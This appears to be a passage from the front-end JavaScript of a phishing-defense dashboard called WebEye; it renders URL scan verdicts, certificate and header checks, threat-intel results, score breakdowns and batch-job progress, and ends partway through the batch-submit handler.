// ===================================================================
// WebEye — Cyber Threat Intelligence & Phishing Defense Platform
// High-Fidelity Dashboard & Interactive Controller (Security Hardened)
// ===================================================================

let currentReport = null;

// XSS Sanitizer Helper (SEC-04)
function escapeHtml(str) {
    if (str === null || str === undefined) return "";
    return String(str)
        .replace(/&/g, "&amp;")
        .replace(/</g, "&lt;")
        .replace(/>/g, "&gt;")
        .replace(/"/g, "&quot;")
        .replace(/'/g, "&#039;");
}

async function loadWebEyeTelemetry() {
    try {
        const [statsResp, readyResp] = await Promise.all([
            fetch("/api/v1/stats"),
            fetch("/api/v1/ready"),
        ]);
        if (statsResp.ok) {
            const st = await statsResp.json();
            const setText = (id, val) => {
                const el = document.getElementById(id);
                if (el) el.textContent = String(val);
            };
            setText("webeye-telemetry-scans", st.total_scans ?? 0);
            setText("webeye-telemetry-threats", st.malicious_detected ?? 0);
            setText("webeye-telemetry-iocs", st.total_iocs ?? 0);
            setText("webeye-side-scans", st.total_scans ?? 0);
            setText("webeye-side-iocs", st.total_iocs ?? 0);
        }
        if (readyResp.ok) {
            const rd = await readyResp.json();
            const postureEl = document.getElementById("webeye-telemetry-posture");
            if (postureEl) {
                postureEl.textContent = String(rd.status || "ready").toUpperCase();
            }
        }
    } catch (_) {
        // Silent fallback on offline preview
    }
}

document.addEventListener("DOMContentLoaded", () => {
    initNavigation();
    initQuickScanModal();
    initQuickExamples();
    loadRecentScans();
    loadIoCs();
    loadEngineMetadata();
    loadWebEyeTelemetry();

    // Single Scan Form
    const scanForm = document.getElementById("scan-form");
    if (scanForm) {
        scanForm.addEventListener("submit", handleScanSubmit);
    }

    // Quick Scan Modal Form
    const modalQuickForm = document.getElementById("modal-quick-scan-form");
    if (modalQuickForm) {
        modalQuickForm.addEventListener("submit", handleModalScanSubmit);
    }

    // Batch Form
    const batchForm = document.getElementById("batch-form");
    if (batchForm) {
        batchForm.addEventListener("submit", handleBatchSubmit);
    }

    // Community Report Form
    const commForm = document.getElementById("community-report-form");
    if (commForm) {
        commForm.addEventListener("submit", handleCommunityReportSubmit);
    }

    // Threat Relationship Graph Controls
    initThreatGraph();

    // Isolated Browser Sandbox Controls
    initBrowserSandbox();

    // Email (.eml) Phishing Analyzer Controls
    initEmailAnalyzer();

    // MITRE ATT&CK Behavioral Investigation Matrix
    initMitreAttack();
});

// ===================================================================
// 1. Navigation & Streamlined View Switching
// ===================================================================
function initNavigation() {
    const navButtons = document.querySelectorAll(".nav-item-btn");
    navButtons.forEach(btn => {
        btn.addEventListener("click", () => {
            const targetTab = btn.getAttribute("data-target-tab");
            if (targetTab) {
                switchTab(targetTab);
            }
        });
    });
}

function switchTab(tabId, skipTabAutoLoad = false) {
    // Update active nav button
    document.querySelectorAll(".nav-item-btn").forEach(btn => {
        if (btn.getAttribute("data-target-tab") === tabId) {
            btn.classList.add("active");
        } else {
            btn.classList.remove("active");
        }
    });

    // Hide all tab views and reveal the target
    document.querySelectorAll(".tab-pane-view").forEach(pane => {
        pane.classList.add("hidden");
    });

    const targetPane = document.getElementById(tabId);
    if (targetPane) {
        targetPane.classList.remove("hidden");
    }

    // Update Header title
    const headerTitle = document.getElementById("current-page-heading");
    if (headerTitle) {
        switch (tabId) {
            case "tab-scanner":
                headerTitle.textContent = "Live Threat Assessment & Heuristic Scanner";
                break;
            case "tab-batch":
                headerTitle.textContent = "Batch Domain & URL Evaluation";
                loadBatchJobsHistory();
                break;
            case "tab-threat-intel":
                headerTitle.textContent = "Collaborative Threat Indicators & IoC Feed";
                loadIoCs();
                break;
            case "tab-graph":
                headerTitle.textContent = "Threat Relationship Graph & Infrastructure Pivots";
                loadThreatGraph();
                break;
            case "tab-sandbox":
                headerTitle.textContent = "Isolated Browser Phishing Sandbox";
                loadSandboxHistory();
                break;
            case "tab-email":
                headerTitle.textContent = "Email (.eml) Phishing & Attachment Forensics";
                loadEmailHistory();
                break;
            case "tab-mitre":
                headerTitle.textContent = "MITRE ATT&CK Behavioral Mapping & Investigation";
                if (!skipTabAutoLoad) loadMitreReport();
                break;
            case "tab-history":
                headerTitle.textContent = "Historical Security Audits & STIX Logs";
                loadRecentScans();
                break;
            case "tab-infographics":
                headerTitle.textContent = "Security Engine Architecture & Infographics";
                loadEngineMetadata();
                break;
            default:
                headerTitle.textContent = "Live Threat Assessment & Heuristic Scanner";
        }
    }
}

// ===================================================================
// 2. Engine Metadata & Infographics Loader
// ===================================================================
async function loadEngineMetadata() {
    try {
        const resp = await fetch("/api/engine-metadata");
        if (resp.ok) {
            const data = await resp.json();
            // KaTeX math formula rendering if available
            if (window.katex) {
                const mathEl = document.querySelector(".entropy-math-formula");
                if (mathEl) {
                    window.katex.render("H(X) = -\\sum_{i=1}^n P(x_i) \\log_2 P(x_i)", mathEl, { throwOnError: false });
                }
            }
        }
    } catch (e) {
        console.warn("Could not load engine metadata:", e);
    }
}

// ===================================================================
// 3. Quick Scan & Search Command Palette (Ctrl+K / ⌘K)
// ===================================================================
function initQuickScanModal() {
    const modal = document.getElementById("modal-quick-scan");
    const btnTrigger = document.getElementById("btn-quick-search-trigger");
    const btnOpenScan = document.getElementById("btn-open-scan-modal");
    const btnClose = document.getElementById("btn-close-quick-scan");
    const input = document.getElementById("modal-url-input");

    function openModal() {
        modal.classList.remove("hidden");
        setTimeout(() => input?.focus(), 50);
    }

    function closeModal() {
        modal.classList.add("hidden");
    }

    if (btnTrigger) btnTrigger.addEventListener("click", openModal);
    if (btnOpenScan) btnOpenScan.addEventListener("click", openModal);
    if (btnClose) btnClose.addEventListener("click", closeModal);

    // Global keyboard shortcut: Ctrl+K or Cmd+K
    window.addEventListener("keydown", (e) => {
        if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
            e.preventDefault();
            if (modal.classList.contains("hidden")) {
                openModal();
            } else {
                closeModal();
            }
        }
        if (e.key === "Escape") {
            closeModal();
            document.getElementById("modal-submit")?.classList.add("hidden");
            document.getElementById("modal-sandbox-shot")?.classList.add("hidden");
        }
    });

    // Close on clicking backdrop
    modal.addEventListener("click", (e) => {
        if (e.target === modal) closeModal();
    });

    // Quick samples inside modal
    document.querySelectorAll(".quick-modal-ex").forEach(btn => {
        btn.addEventListener("click", () => {
            if (input) {
                input.value = btn.dataset.url;
                document.getElementById("modal-quick-scan-form").dispatchEvent(new Event("submit"));
            }
        });
    });
}

// Quick Sample Buttons in Scanner Tab
function initQuickExamples() {
    document.querySelectorAll(".quick-example").forEach(btn => {
        btn.addEventListener("click", (e) => {
            e.preventDefault();
            const input = document.getElementById("url-input");
            if (input) {
                input.value = btn.dataset.url;
                document.getElementById("scan-form").dispatchEvent(new Event("submit"));
            }
        });
    });
}

// ===================================================================
// 6. Live Assessment & Threat Scanner Execution
// ===================================================================
async function handleScanSubmit(e) {
    e.preventDefault();
    const input = document.getElementById("url-input");
    const url = input.value.trim();
    if (!url) return;

    await executeScanTarget(url);
}

async function handleModalScanSubmit(e) {
    e.preventDefault();
    const input = document.getElementById("modal-url-input");
    const url = input.value.trim();
    if (!url) return;

    document.getElementById("modal-quick-scan").classList.add("hidden");
    switchTab("tab-scanner");
    document.getElementById("url-input").value = url;
    await executeScanTarget(url);
}

async function executeScanTarget(url) {
    const fetchContent = document.getElementById("opt-fetch-content")?.checked ?? true;
    const deepDns = document.getElementById("opt-deep-dns")?.checked ?? true;
    const refreshIntel = document.getElementById("opt-refresh-intel")?.checked ?? false;

    const scanBtn = document.getElementById("btn-scan");
    const scanStatus = document.getElementById("scan-loading");
    const resultsContainer = document.getElementById("scan-results");

    if (scanBtn) {
        scanBtn.disabled = true;
        scanBtn.textContent = "Analyzing Target...";
    }
    if (scanStatus) scanStatus.classList.remove("hidden");
    if (resultsContainer) resultsContainer.classList.add("hidden");

    try {
        const resp = await fetch("/api/scan", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                url: url,
                fetch_content: fetchContent,
                deep_dns: deepDns,
                refresh_intel: refreshIntel
            })
        });

        if (!resp.ok) {
            const err = await resp.json();
            alert("Scan failed: " + (err.detail || "Server error"));
            return;
        }

        const data = await resp.json();
        currentReport = data;
        displayResults(data);
        loadRecentScans();
    } catch (err) {
        alert("Scan request failed: " + err.message);
    } finally {
        if (scanStatus) scanStatus.classList.add("hidden");
        if (scanBtn) {
            scanBtn.disabled = false;
            scanBtn.innerHTML = `
                <svg class="w-4 h-4" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
                </svg>
                <span>Execute Scan</span>
            `;
        }
    }
}

// Display Full Scan Audit Report (XSS Sanitized)
function displayResults(data) {
    const resultsContainer = document.getElementById("scan-results");
    resultsContainer.classList.remove("hidden");
    resultsContainer.scrollIntoView({ behavior: "smooth" });

    // Target Overview
    document.getElementById("res-domain").textContent = data.target_domain;
    document.getElementById("res-url").textContent = data.target_url;
    document.getElementById("res-url").href = data.target_url;
    document.getElementById("res-scan-id").textContent = data.scan_id;
    document.getElementById("res-timestamp").textContent = new Date(data.timestamp).toLocaleString();

    // Verdict Badge & Score
    const verdictEl = document.getElementById("res-verdict");
    const scoreVal = Math.round(data.overall_score);
    document.getElementById("res-score").textContent = scoreVal;

    let badgeClass = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/30";
    let scoreColor = "#10b981";

    if (data.verdict === "MALICIOUS") {
        badgeClass = "bg-rose-500/10 text-rose-400 border border-rose-500/30";
        scoreColor = "#ef4444";
        verdictEl.textContent = "Malicious";
    } else if (data.verdict === "HIGH_RISK") {
        badgeClass = "bg-amber-500/10 text-amber-400 border border-amber-500/30";
        scoreColor = "#f59e0b";
        verdictEl.textContent = "High Risk";
    } else if (data.verdict === "SUSPICIOUS") {
        badgeClass = "bg-amber-500/10 text-amber-400 border border-amber-500/30";
        scoreColor = "#f59e0b";
        verdictEl.textContent = "Suspicious";
    } else {
        verdictEl.textContent = "Clean / Safe";
    }

    verdictEl.className = `px-3 py-0.5 rounded-full text-xs font-semibold ${badgeClass}`;

    // Confidence Badge
    const confBadge = document.getElementById("res-confidence-badge");
    if (confBadge) {
        if (typeof data.confidence === "number" && data.confidence > 0) {
            const level = (data.confidence_level || "MEDIUM").toUpperCase();
            let confClass = "bg-amber-500/10 text-amber-300 border border-amber-500/30";
            if (level === "HIGH") confClass = "bg-emerald-500/10 text-emerald-300 border border-emerald-500/30";
            else if (level === "LOW") confClass = "bg-rose-500/10 text-rose-300 border border-rose-500/30";
            confBadge.className = `px-2.5 py-0.5 rounded-full text-xs font-semibold ${confClass}`;
            confBadge.textContent = `Confidence: ${Math.round(data.confidence)}% (${level})`;
        } else {
            confBadge.className = "px-2.5 py-0.5 rounded-full text-xs font-semibold bg-slate-500/10 text-slate-400 border border-slate-500/30";
            confBadge.textContent = "Confidence: Legacy";
        }
    }

    // Score Circle Progress
    const circle = document.getElementById("score-circle-bar");
    const radius = 32;
    const circ = 2 * Math.PI * radius;
    circle.style.strokeDasharray = `${circ} ${circ}`;
    circle.style.strokeDashoffset = circ - (scoreVal / 100) * circ;
    circle.style.stroke = scoreColor;

    // Summary Text
    document.getElementById("res-summary").textContent = data.summary;

    // Export PDF, STIX, Threat Graph & Browser Sandbox Buttons
    const btnGraph = document.getElementById("btn-view-in-graph");
    if (btnGraph) {
        btnGraph.onclick = () => {
            viewScanInGraph(data.scan_id);
        };
    }
    const btnSandbox = document.getElementById("btn-run-in-sandbox");
    if (btnSandbox) {
        btnSandbox.onclick = () => {
            runUrlInSandbox(data.target_url, data.scan_id);
        };
    }
    const btnMitre = document.getElementById("btn-view-in-mitre");
    if (btnMitre) {
        btnMitre.onclick = () => {
            viewInMitre({ scanId: data.scan_id });
        };
    }
    const btnPdf = document.getElementById("btn-export-pdf");
    if (btnPdf) {
        btnPdf.onclick = () => {
            window.open(`/api/export/pdf/${encodeURIComponent(data.scan_id)}`, "_blank");
        };
    }
    document.getElementById("btn-export-stix").onclick = () => {
        window.open(`/api/export/stix/${encodeURIComponent(data.scan_id)}`, "_blank");
    };

    // Explainable Risk Scoring Panel
    renderExplainableScoring(data);

    // 1. Threat Analysis
    const t = data.threat_analysis;
    document.getElementById("card-threat-score").textContent = `${Math.round(t.score)}/100`;
    document.getElementById("val-entropy").textContent = t.entropy;
    document.getElementById("val-impersonation").textContent = t.impersonated_brand || "None";
    document.getElementById("val-homoglyph").textContent = t.homoglyph_detected ? "Detected" : "None";
    document.getElementById("val-password").textContent = t.has_password_input ? "Yes" : "No";

    const flagsList = document.getElementById("list-threat-flags");
    flagsList.innerHTML = "";
    const allFlags = [...(t.lexical_flags || []), ...(t.content_flags || [])];
    if (allFlags.length === 0) {
        flagsList.innerHTML = `<li class="text-xs text-slate-400">No malicious indicators found.</li>`;
    } else {
        allFlags.forEach(flag => {
            const li = document.createElement("li");
            li.className = "text-xs text-slate-300 flex items-start gap-1.5";
            li.innerHTML = `<span class="text-rose-400 font-bold">•</span> <span>${escapeHtml(flag)}</span>`;
            flagsList.appendChild(li);
        });
    }

    // 2. Web Security Posture
    const s = data.web_security;
    document.getElementById("card-sec-score").textContent = `${Math.round(s.score)}/100`;
    document.getElementById("val-headers-grade").textContent = s.headers_grade;
    document.getElementById("val-hsts").textContent = s.hsts_enabled ? "Enabled" : "Missing";
    document.getElementById("val-spf").textContent = s.spf_status;
    document.getElementById("val-dmarc").textContent = s.dmarc_status;
    document.getElementById("val-ip").textContent = s.ip_address || "N/A";

    // 3. Certificate Validation
    const c = data.cert_validation;
    document.getElementById("card-cert-score").textContent = `${Math.round(c.score)}/100`;
    document.getElementById("val-cert-valid").textContent = c.valid ? "Valid" : "Invalid / None";
    document.getElementById("val-cert-valid").className = c.valid ? "text-emerald-400 font-semibold" : "text-rose-400 font-semibold";
    document.getElementById("val-cert-issuer").textContent = c.issuer || "None";
    document.getElementById("val-cert-age").textContent = c.age_days !== null ? `${c.age_days} days old` : "N/A";
    document.getElementById("val-cert-mismatch").textContent = c.san_mismatch ? "Mismatch Detected" : "Passed";

    // 4. Real-Time Threat Intel
    const i = data.threat_intel;
    document.getElementById("card-intel-score").textContent = `${Math.round(i.score)}/100`;
    document.getElementById("val-urlhaus").textContent = i.urlhaus_status || "Clean";
    const cacheHitsEl = document.getElementById("val-cache-hits");
    if (cacheHitsEl) {
        const hits = i.cache_hits || 0;
        cacheHitsEl.textContent = `${hits} cached`;
    }
    document.getElementById("val-votes-malicious").textContent = i.community_votes_malicious || 0;
    document.getElementById("val-votes-benign").textContent = i.community_votes_benign || 0;

    const providersContainer = document.getElementById("container-cti-providers");
    if (providersContainer) {
        providersContainer.innerHTML = "";
        const providers = Array.isArray(i.providers) ? i.providers : [];
        if (providers.length === 0) {
            providersContainer.innerHTML = `
                <div class="p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] text-slate-400">
                    URLhaus: ${escapeHtml(i.urlhaus_status || "Clean")}
                </div>
            `;
        } else {
            providers.forEach(p => {
                const st = (p.status || "clean").toLowerCase();
                let stClass = "bg-emerald-500/10 text-emerald-300 border-emerald-500/30";
                if (st === "matched") stClass = "bg-rose-500/10 text-rose-300 border-rose-500/30";
                else if (st === "unavailable") stClass = "bg-amber-500/10 text-amber-300 border-amber-500/30";
                else if (st === "unconfigured") stClass = "bg-slate-500/10 text-slate-400 border-slate-500/30";

                const cacheBadge = p.cached
                    ? `<span class="px-1.5 py-0.5 rounded text-[10px] bg-blue-500/10 text-blue-300 border border-blue-500/30">CACHED</span>`
                    : (st === "matched" || st === "clean"
                        ? `<span class="px-1.5 py-0.5 rounded text-[10px] bg-[#141b29] text-slate-400 border border-[#233149]">LIVE</span>`
                        : "");

                const updatedText = p.last_updated ? new Date(p.last_updated).toLocaleString() : "N/A";
                const confText = p.match_confidence ? `${Math.round(p.match_confidence)}% conf` : "--";
                const safeRef = (typeof p.reference_url === "string" && /^https?:\/\//i.test(p.reference_url))
                    ? `<a href="${escapeHtml(p.reference_url)}" target="_blank" rel="noopener noreferrer" class="text-blue-400 hover:underline ml-1">ref</a>`
                    : "";

                const row = document.createElement("div");
                row.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] space-y-1";
                row.innerHTML = `
                    <div class="flex items-center justify-between gap-2">
                        <span class="font-semibold text-slate-200 truncate">${escapeHtml(p.source)}</span>
                        <div class="flex items-center gap-1.5 flex-shrink-0">
                            ${cacheBadge}
                            <span class="px-1.5 py-0.5 rounded text-[10px] font-semibold uppercase border ${stClass}">${escapeHtml(st)}</span>
                        </div>
                    </div>
                    <div class="text-[11px] text-slate-400 leading-snug">
                        ${escapeHtml(p.provenance || p.summary || "")}${safeRef}
                    </div>
                    <div class="flex items-center justify-between text-[10px] text-slate-500">
                        <span>Match Conf: ${escapeHtml(confText)}</span>
                        <span>Updated: ${escapeHtml(updatedText)}</span>
                    </div>
                `;
                providersContainer.appendChild(row);
            });
        }
    }

    const tagsContainer = document.getElementById("container-intel-tags");
    tagsContainer.innerHTML = "";
    if (i.tags && i.tags.length > 0) {
        i.tags.forEach(t => {
            const span = document.createElement("span");
            span.className = "px-2 py-0.5 rounded text-[11px] bg-[#141b29] text-slate-300 border border-[#233149]";
            span.textContent = t;
            tagsContainer.appendChild(span);
        });
    } else {
        tagsContainer.innerHTML = `<span class="text-xs text-slate-500">None</span>`;
    }

    // Mitigations
    const mitList = document.getElementById("list-mitigations");
    mitList.innerHTML = "";
    if (data.mitigations && data.mitigations.length > 0) {
        data.mitigations.forEach(m => {
            const li = document.createElement("li");
            li.className = "text-xs text-slate-300 flex items-start gap-2";
            li.innerHTML = `<span class="text-blue-400 font-bold">•</span> <span>${escapeHtml(m)}</span>`;
            mitList.appendChild(li);
        });
    }
}

function renderExplainableScoring(data) {
    const reasonEl = document.getElementById("res-confidence-reason");
    const totalEl = document.getElementById("res-breakdown-total");
    const breakdownList = document.getElementById("list-score-breakdown");
    const enginesContainer = document.getElementById("container-engine-scores");
    const missingList = document.getElementById("list-missing-evidence");

    if (!breakdownList || !enginesContainer || !missingList) return;

    const totalScore = Number(data.overall_score || 0).toFixed(1);
    if (totalEl) totalEl.textContent = `Total: ${totalScore} / 100`;

    if (reasonEl) {
        reasonEl.textContent = data.confidence_reason
            || "Legacy scan report: detailed factor breakdown unavailable.";
    }

    // 1. Score Drivers Breakdown
    breakdownList.innerHTML = "";
    const breakdown = Array.isArray(data.score_breakdown) ? data.score_breakdown : [];
    if (breakdown.length === 0) {
        const hasScore = Number(data.overall_score || 0) > 0;
        breakdownList.innerHTML = hasScore
            ? `<li class="p-2 rounded-lg bg-[#0b0f17] border border-[#1b2538] text-slate-400">Legacy scan record without factor-level breakdown.</li>`
            : `<li class="p-2 rounded-lg bg-[#0b0f17] border border-[#1b2538] text-emerald-400">No risk penalty factors triggered (+0.0).</li>`;
    } else {
        breakdown.forEach(item => {
            const pts = Number(item.points || 0);
            const rawPts = Number(item.raw_points ?? pts);
            const sign = pts >= 0 ? "+" : "";
            const rawSign = rawPts >= 0 ? "+" : "";
            let ptsColor = "text-amber-300";
            if (pts >= 15) ptsColor = "text-rose-400";
            else if (pts < 0) ptsColor = "text-emerald-400";

            const li = document.createElement("li");
            li.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] flex items-start justify-between gap-2";
            li.innerHTML = `
                <div class="min-w-0">
                    <div class="text-slate-200 font-medium leading-snug">${escapeHtml(item.label)}</div>
                    <div class="text-[11px] text-slate-500 mt-0.5 truncate">
                        ${escapeHtml(item.engine_label || item.engine)}
                        ${item.evidence ? ` · ${escapeHtml(item.evidence)}` : ""}
                    </div>
                </div>
                <div class="text-right flex-shrink-0">
                    <span class="font-bold mono ${ptsColor}">${sign}${pts.toFixed(1)}</span>
                    <div class="text-[10px] text-slate-500 mono">raw ${rawSign}${rawPts.toFixed(0)}</div>
                </div>
            `;
            breakdownList.appendChild(li);
        });
    }

    // 2. Individual Engine Scores
    enginesContainer.innerHTML = "";
    const engineScores = Array.isArray(data.engine_scores) && data.engine_scores.length > 0
        ? data.engine_scores
        : [
            { name: "Heuristic Threat Analyzer", score: data.threat_analysis?.score ?? 0, weight: 0.35, weighted_score: (data.threat_analysis?.score ?? 0) * 0.35, status: "evaluated", confidence: null },
            { name: "Web Security Posture", score: data.web_security?.score ?? 0, weight: 0.20, weighted_score: (data.web_security?.score ?? 0) * 0.20, status: "evaluated", confidence: null },
            { name: "SSL/TLS Certificate", score: data.cert_validation?.score ?? 0, weight: 0.20, weighted_score: (data.cert_validation?.score ?? 0) * 0.20, status: "evaluated", confidence: null },
            { name: "Collaborative Threat Intel", score: data.threat_intel?.score ?? 0, weight: 0.25, weighted_score: (data.threat_intel?.score ?? 0) * 0.25, status: "evaluated", confidence: null },
        ];

    engineScores.forEach(eng => {
        const sVal = Math.max(0, Math.min(100, Number(eng.score || 0)));
        const wPct = Math.round(Number(eng.weight || 0) * 100);
        const weighted = Number(eng.weighted_score ?? (sVal * Number(eng.weight || 0))).toFixed(1);
        let barColor = "bg-emerald-500";
        if (sVal >= 75) barColor = "bg-rose-500";
        else if (sVal >= 50) barColor = "bg-orange-500";
        else if (sVal >= 25) barColor = "bg-amber-400";

        const statusBadge = eng.status === "unavailable"
            ? `<span class="text-rose-400">unavailable</span>`
            : eng.status === "partial"
                ? `<span class="text-amber-300">partial</span>`
                : `<span class="text-emerald-400">${escapeHtml(eng.status || "evaluated")}</span>`;

        const confStr = typeof eng.confidence === "number" ? ` · ${Math.round(eng.confidence)}% conf` : "";

        const row = document.createElement("div");
        row.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] space-y-1.5 text-xs";
        row.innerHTML = `
            <div class="flex items-center justify-between gap-2">
                <span class="text-slate-200 font-medium truncate">${escapeHtml(eng.name)}</span>
                <span class="mono text-slate-300 font-semibold flex-shrink-0">${sVal.toFixed(1)}/100</span>
            </div>
            <div class="w-full h-1.5 rounded-full bg-[#151c2b] overflow-hidden">
                <div class="h-full ${barColor} rounded-full" style="width: ${sVal}%"></div>
            </div>
            <div class="flex items-center justify-between text-[10px] text-slate-500">
                <span>Weight ${wPct}% (+${weighted} pts)</span>
                <span>${statusBadge}${confStr}</span>
            </div>
        `;
        enginesContainer.appendChild(row);
    });

    // 3. Missing Evidence
    missingList.innerHTML = "";
    const missing = Array.isArray(data.missing_evidence) ? data.missing_evidence : [];
    if (missing.length === 0) {
        missingList.innerHTML = `<li class="p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] text-emerald-400">All expected evidence signals were collected.</li>`;
    } else {
        missing.forEach(gap => {
            let dotColor = "text-slate-400";
            if (gap.impact === "high") dotColor = "text-rose-400";
            else if (gap.impact === "medium") dotColor = "text-amber-300";

            const li = document.createElement("li");
            li.className = "p-2.5 rounded-lg bg-[#0b0f17] border border-[#1b2538] flex items-start gap-2";
            li.innerHTML = `
                <span class="${dotColor} font-bold mt-0.5">•</span>
                <div class="min-w-0">
                    <div class="text-slate-200 font-medium">${escapeHtml(gap.check)}</div>
                    <div class="text-[11px] text-slate-400 mt-0.5">${escapeHtml(gap.reason)}</div>
                </div>
            `;
            missingList.appendChild(li);
        });
    }
}

// Community Consensus Voting
async function castVote(voteType) {
    if (!currentReport) return;
    try {
        const resp = await fetch("/api/community/vote", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                indicator: currentReport.target_url,
                vote: voteType,
                reason: `Analyst feedback from scan ${currentReport.scan_id}`
            })
        });
        if (resp.ok) {
            alert(`Recorded ${voteType.toUpperCase()} consensus vote.`);
            if (voteType === "malicious") {
                const el = document.getElementById("val-votes-malicious");
                if (el) el.textContent = parseInt(el.textContent) + 1;
            } else {
                const el = document.getElementById("val-votes-benign");
                if (el) el.textContent = parseInt(el.textContent) + 1;
            }
        }
    } catch (e) {
        alert("Failed to submit vote: " + e.message);
    }
}

// ===================================================================
// 7. Asynchronous Bounded-Concurrency Batch Scanner
// ===================================================================
let _activeBatchPollTimer = null;
let _activeBatchJobId = null;

function _renderBatchRows(results) {
    const container = document.getElementById("batch-results-wrap");
    const tbody = document.getElementById("batch-table-body");
    if (!container || !tbody) return;
    container.classList.remove("hidden");
    tbody.innerHTML = "";

    (results || []).forEach(res => {
        const tr = document.createElement("tr");
        tr.className = "border-b border-[#1b2538] hover:bg-[#141b29] transition";

        if (res.error) {
            tr.innerHTML = `
                <td class="py-3 px-4 mono text-slate-300 truncate max-w-xs">${escapeHtml(res.url)}</td>
                <td class="py-3 px-4 text-slate-500">-</td>
                <td class="py-3 px-4 text-center">-</td>
                <td class="py-3 px-4 text-center"><span class="text-rose-400 font-semibold">Error: ${escapeHtml(res.error)}</span></td>
                <td class="py-3 px-4 text-right text-slate-500">Failed</td>
            `;
        } else {
            let badgeClass = "bg-emerald-500/10 text-emerald-400 border border-emerald-500/30";
            if (res.verdict === "MALICIOUS") badgeClass = "bg-rose-500/10 text-rose-400 border border-rose-500/30";
            else if (res.verdict === "HIGH_RISK" || res.verdict === "SUSPICIOUS") badgeClass = "bg-amber-500/10 text-amber-400 border border-amber-500/30";

            tr.innerHTML = `
                <td class="py-3 px-4 mono text-slate-300 truncate max-w-xs">${escapeHtml(res.url)}</td>
                <td class="py-3 px-4 font-semibold text-white">${escapeHtml(res.domain)}</td>
                <td class="py-3 px-4 text-center font-bold text-white">${Math.round(res.score || 0)}</td>
                <td class="py-3 px-4 text-center">
                    <span class="px-2 py-0.5 rounded text-[11px] font-semibold ${badgeClass}">
                        ${escapeHtml(res.verdict)}
                    </span>
                </td>
                <td class="py-3 px-4 text-right">
                    <button onclick="inspectScan('${escapeHtml(res.scan_id)}')" class="text-blue-400 hover:underline">View Audit</button>
                </td>
            `;
        }
        tbody.appendChild(tr);
    });
}

function _updateBatchProgressUI(job) {
    const panel = document.getElementById("batch-progress-panel");
    const jobBadge = document.getElementById("batch-job-id-badge");
    const statusEl = document.getElementById("batch-progress-status");
    const textEl = document.getElementById("batch-progress-text");
    const barEl = document.getElementById("batch-progress-bar");
    const cancelBtn = document.getElementById("btn-batch-cancel");
    if (!panel) return;

    panel.classList.remove("hidden");
    const pct = Math.min(100, Math.max(0, Number(job.progress_pct || 0)));
    if (jobBadge) jobBadge.textContent = job.job_id || "JOB";
    if (statusEl) {
        const st = String(job.status || "queued").toUpperCase();
        statusEl.textContent = st;
        if (st === "COMPLETED") statusEl.className = "font-semibold uppercase text-emerald-400";
        else if (st === "FAILED" || st === "CANCELLED") statusEl.className = "font-semibold uppercase text-rose-400";
        else statusEl.className = "font-semibold uppercase text-amber-300";
    }
    if (textEl) {
        textEl.textContent = `${job.completed_urls || 0} / ${job.total_urls || 0} completed (${pct}%) · ${job.failed_urls || 0} errors`;
    }
    if (barEl) barEl.style.width = `${pct}%`;

    const isDone = ["completed", "completed_with_errors", "failed", "cancelled"].includes(String(job.status || "").toLowerCase());
    if (cancelBtn) {
        if (isDone) cancelBtn.classList.add("hidden");
        else {
            cancelBtn.classList.remove("hidden");
            cancelBtn.onclick = async () => {
                if (!_activeBatchJobId) return;
                await fetch(`/api/v1/jobs/${encodeURIComponent(_activeBatchJobId)}/cancel`, { method: "POST" });
                pollBatchJob(_activeBatchJobId);
            };
        }
    }
}

async function pollBatchJob(jobId) {
    try {
        const resp = await fetch(`/api/v1/jobs/${encodeURIComponent(jobId)}`);
        if (!resp.ok) return;
        const job = await resp.json();
        _updateBatchProgressUI(job);
        _renderBatchRows(job.results || []);

        const isDone = ["completed", "completed_with_errors", "failed", "cancelled"].includes(String(job.status || "").toLowerCase());
        if (isDone) {
            if (_activeBatchPollTimer) {
                clearInterval(_activeBatchPollTimer);
                _activeBatchPollTimer = null;
            }
            const btn = document.getElementById("btn-batch-scan");
            if (btn) {
                btn.disabled = false;
                btn.textContent = "Queue Async Batch Job";
            }
            loadBatchJobsHistory();
        }
    } catch (e) {
        console.error("Failed polling batch job:", e);
    }
}

async function loadBatchJobsHistory() {
    const tbody = document.getElementById("batch-jobs-tbody");
    if (!tbody) return;
    try {
        const resp = await fetch("/api/v1/jobs?limit=12");
        if (!resp.ok) return;
        const rows = await resp.json();
        tbody.innerHTML = "";
        if (!rows.length) {
            tbody.innerHTML = `<tr><td colspan="6" class="text-center py-4 text-slate-500">No asynchronous batch jobs recorded yet.</td></tr>`;
            return;
        }
        rows.forEach(j => {
            const tr = document.createElement("tr");
            tr.className = "border-b border-[#1b2538] hover:bg-[#141b29]";
            tr.innerHTML = `
                <td class="py-2 px-3 mono text-slate-300">${escapeHtml(j.job_id)}</td>
                <td class="py-2 px-3 uppercase font-semibold text-xs text-slate-200">${escapeHtml(j.status)}</td>
                <td class="py-2 px-3 text-center mono text-slate-300">${j.completed_urls}/${j.total_urls} (${Math.round(j.progress_pct || 0)}%)</td>
                <td class="py-2 px-3 text-center mono text-slate-400">${j.concurrency_limit}×</td>
                <td class="py-2 px-3 text-slate-400">${new Date(j.created_at).toLocaleString()}</td>
                <td class="py-2 px-3 text-right"><button type="button" onclick="pollBatchJob('${escapeHtml(j.job_id)}')" class="text-blue-400 hover:underline">Inspect</button></td>
            `;
            tbody.appendChild(tr);
        });
    } catch (e) {
        console.error("Failed loading batch jobs:", e);
    }
}

async function handleBatchSubmit(e) {
    e.preventDefault();
    const text = document.getElementById("batch-urls-input").value.trim();
    if (!text) return;

    const urls = text.split("\n").map(u => u.trim()).filter(u => u.length > 0);
    const btn = document.getElementById("btn-batch-scan");
    const concSel = document.getElementById("batch-concurrency-select");
    const concurrency = concSel ? parseInt(concSel.value, 10) : 4;

    if (_activeBatchPollTimer) {
        clearInterval(_activeBatchPollTimer);
        _activeBatchPollTimer = null;
    }

    btn.disabled = true;
    btn.textContent = "Queuing Batch Job...";

    try {
